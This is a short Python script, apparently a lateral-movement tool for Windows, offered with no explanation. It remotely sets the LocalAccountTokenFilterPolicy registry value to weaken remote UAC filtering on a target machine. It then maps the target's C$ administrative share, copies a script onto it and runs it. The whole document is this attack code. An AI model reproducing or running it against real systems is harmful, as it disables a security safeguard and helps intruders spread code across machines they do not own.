import os,winreg,shutil

def enableAdminShare(computerName):
    regpath="SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    reg=winreg.ConnectRegistry(computerName,winreg.HKEY_LOCAL_MACHINE)
    key=winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
    winreg.SetValueEx(key,"LocalAccountTokenFilterPolicy",0,winreg.REG_DWORD,1)

def accessAdminShare(computerName,executable):
    remote=r"\\"+computerName+'\c$'
    local="Z:"
    remotefile=local+"\\"+executable
    localfile=os.path.join(os.getcwd(),executable)
    os.system("net use "+local+" "+remote)
    shutil.move(localfile,remotefile)
    os.system("py "+remotefile)
    os.system("net use "+local+" /delete")

accessAdminShare(os.environ["COMPUTERNAME"],"remote_task.py")